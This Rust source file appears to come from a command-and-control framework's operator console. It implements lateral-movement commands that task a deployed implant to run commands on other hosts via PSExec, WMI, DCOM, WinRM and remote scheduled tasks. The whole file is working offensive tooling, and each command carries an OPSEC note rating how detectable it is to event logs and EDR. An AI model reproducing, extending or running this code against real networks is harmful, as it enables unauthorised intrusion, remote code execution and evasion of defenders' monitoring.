//! Lateral movement commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_error, print_info, print_success};

/// Execute command on remote host via PSExec
pub async fn psexec(cli: &CliState, target: &str, command: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Executing via PSExec on {}...", target));
    print_error("OPSEC WARNING: PSExec creates a named pipe and service - noise level HIGH");

    let task = protocol::LateralTask {
        operation: Some(protocol::lateral_task::Operation::Psexec(protocol::LateralPsexec {
            target: target.to_string(),
            payload: command.as_bytes().to_vec(),
            service_name: String::new(),
            username: None,
            password: None,
            domain: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "lateral", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Execute command on remote host via WMI
pub async fn wmi(cli: &CliState, target: &str, command: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Executing via WMI on {}...", target));
    print_info("OPSEC WARNING: WMI execution may be logged - noise level MEDIUM");

    let task = protocol::LateralTask {
        operation: Some(protocol::lateral_task::Operation::Wmi(protocol::LateralWmi {
            target: target.to_string(),
            command: command.to_string(),
            username: None,
            password: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "lateral", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Execute command on remote host via DCOM
pub async fn dcom(cli: &CliState, target: &str, command: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Executing via DCOM on {}...", target));
    print_info("OPSEC WARNING: DCOM lateral movement may trigger EDR alerts - noise level MEDIUM");

    let task = protocol::LateralTask {
        operation: Some(protocol::lateral_task::Operation::Dcom(protocol::LateralDcom {
            target: target.to_string(),
            command: command.to_string(),
            dcom_object: String::new(),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "lateral", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Execute command on remote host via WinRM
pub async fn winrm(cli: &CliState, target: &str, command: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Executing via WinRM on {}...", target));
    print_info("OPSEC: WinRM is relatively low noise if already enabled on target - noise level LOW");

    let task = protocol::LateralTask {
        operation: Some(protocol::lateral_task::Operation::Winrm(protocol::LateralWinrm {
            target: target.to_string(),
            command: command.to_string(),
            use_ssl: false,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "lateral", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Create and run scheduled task on remote host
pub async fn schtask(cli: &CliState, target: &str, task_name: &str, command: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Creating scheduled task '{}' on {}...", task_name, target));
    print_info("OPSEC WARNING: Scheduled task creation is logged in Windows event logs - noise level MEDIUM");

    let task = protocol::LateralTask {
        operation: Some(protocol::lateral_task::Operation::Schtask(protocol::LateralSchtask {
            target: target.to_string(),
            command: command.to_string(),
            task_name: task_name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "lateral", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}
